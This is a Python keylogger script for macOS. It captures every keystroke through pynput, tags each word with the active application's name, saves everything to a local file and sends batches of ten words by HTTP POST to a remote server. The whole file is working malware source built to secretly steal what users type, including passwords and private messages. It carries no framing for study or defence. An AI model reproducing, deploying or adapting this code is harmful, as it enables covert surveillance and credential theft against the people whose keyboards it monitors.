import logging
import requests
from pynput.keyboard import Key, Listener
import os
import threading
import time
import platform

# macOS-specific imports
if platform.system() == 'Darwin':
    from AppKit import NSWorkspace
    import Quartz

# Configuring the logger to also log to console for debugging
logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format='%(asctime)s: %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler("keylog.txt"),
        logging.StreamHandler()  # Log to console
    ]
)

# File for local keylogging
log_file = "keylog.txt"
# URL of the server to send key logs
server_url = 'http://<your_server_ip>:8080/log'  # Replace with your actual server IP and port

# Word buffer to accumulate characters into words
word_buffer = []
buffer_size = 10  # Send after every 10 words
context_buffer = []

# Function to get the active window title on macOS
def get_active_window_title():
    try:
        active_app = NSWorkspace.sharedWorkspace().activeApplication()
        window_title = active_app['NSApplicationName']
        return window_title
    except Exception as e:
        logging.error(f"Error getting active window title: {e}")
        return "Unknown Window"

# Send logs to the server
def send_logs(data):
    try:
        logging.debug(f"Attempting to send logs: {data}")
        response = requests.post(server_url, data={'key': data}, timeout=10)
        if response.status_code != 200:
            logging.error(f"Failed to send log: HTTP {response.status_code}")
        else:
            logging.debug("Logs sent successfully.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send log due to request exception: {e}")
    except Exception as e:
        logging.error(f"Unexpected error in send_logs: {e}")

# Function to handle word completion
def on_word_completed(word):
    global word_buffer
    try:
        active_window = get_active_window_title()  # Get active window title on macOS
        word_with_context = f"{active_window}: {word}\n"
        word_buffer.append(word_with_context)
        logging.info(f"Word logged: {word_with_context}")

        if len(word_buffer) >= buffer_size:
            logs_to_send = ''.join(word_buffer)
            send_logs(logs_to_send)
            word_buffer = []
    except Exception as e:
        logging.error(f"Error in on_word_completed: {e}")

# Event handler for key press
def on_press(key):
    global context_buffer
    
    try:
        if key == Key.space or key == Key.enter:
            word = ''.join(context_buffer)
            if word:
                on_word_completed(word)
            context_buffer = []  # Reset buffer for next word
        elif key == Key.backspace:
            if context_buffer:
                context_buffer.pop()  # Remove last character if backspace is pressed
        elif hasattr(key, 'char') and key.char is not None:
            context_buffer.append(key.char)  # Add character to the word buffer
        elif key in [Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_r, Key.alt, Key.alt_r, Key.cmd, Key.cmd_r]:
            # Ignore modifier keys
            pass
        else:
            # Handle special keys like punctuation as word boundaries
            word = ''.join(context_buffer)
            if word:
                on_word_completed(word)
            context_buffer = [str(key).replace("'", "")]  # Capture the special key
            on_word_completed(''.join(context_buffer))  # Send special key as word
            context_buffer = []
    except Exception as e:
        logging.error(f"Error in key press handler: {e}")

# Run the keylogger in the background
def run_keylogger():
    logging.info("Starting keylogger...")
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        logging.error(f"Error in run_keylogger: {e}")

if __name__ == "__main__":
    try:
        logging.info("Keylogger is now running...")
        run_keylogger()
    except Exception as e:
        logging.critical(f"Critical failure in main block: {e}")